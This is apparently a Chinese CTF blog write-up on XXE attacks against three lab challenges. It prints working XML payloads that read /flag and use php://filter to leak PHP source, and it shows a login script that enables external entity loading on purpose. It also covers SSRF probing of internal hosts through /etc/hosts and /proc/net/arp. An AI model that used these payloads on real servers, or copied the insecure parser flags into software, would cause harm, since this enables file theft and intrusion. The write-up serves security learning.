---
title: CTF XXE漏洞攻击
tags:
  - CTF-WEB
categories:
  - CTF-WEB
date: 2020-05-07 15:58:00
---
# Fake XML Cookbook
F12 查看源码：

```php
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```
可以看到传输的数据是xml类型
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200507154531604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70)


payload打一下：

```php
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE any [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<user><username>&xxe;</username><password>111</password></user>
```
# True XML Cookbook
首先尝试直接读/flag文件，回显了报错信息，但是发现可以读doLogin文件：

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any[
  <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
]>
<user><username>&file;</username><password>1</password></user>
```
得源码：

```php
//doLogin.php
<?php\n/**
* autor: c0ny1\n* date: 2018-2-7
*/

$USERNAME = 'admin'; //\xe8\xb4\xa6\xe5\x8f\xb7
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //\xe5\xaf\x86\xe7\xa0\x81
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```
最终是利用ssrf读内网文件：

```php
// /etc/hosts
127.0.0.1	localhost
::1		localhost ip6-localhost ip6-loopback
fe00::0		ip6-localnet
ff00::0		ip6-mcastprefix
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
173.17.80.9		osrc
```
内网ip，173.17.80.9

```powershell
// /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
173.17.80.2      0x1         0x2         02:42:ad:11:50:02     *        eth0
173.17.80.12     0x1         0x2         02:42:ad:11:50:0c     *        eth0
```

最后试了173.17.80.10可以得flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302112638332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L291YmFzYW5nZGFkYWRh,size_16,color_FFFFFF,t_70)
# ISCC  未知的风险-1
前面是jwt爆破得到秘钥123456伪造user用户就不说了，之后是一个登录框，和上面两个题目差不多，doLogin()方法相同，题目根目录下有flag.php。用xxe读取文件

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any[
  <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
]>
<user><username>&file;</username><password>1</password></user>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200507155154905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70)
>读取/var/www/html是因为这是Apache默认根目录
>
base64解码即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200507155712628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70)
# 参考
[某个(忘了)比赛的两道XML](https://blog.csdn.net/oubasangdadada/article/details/104608104)
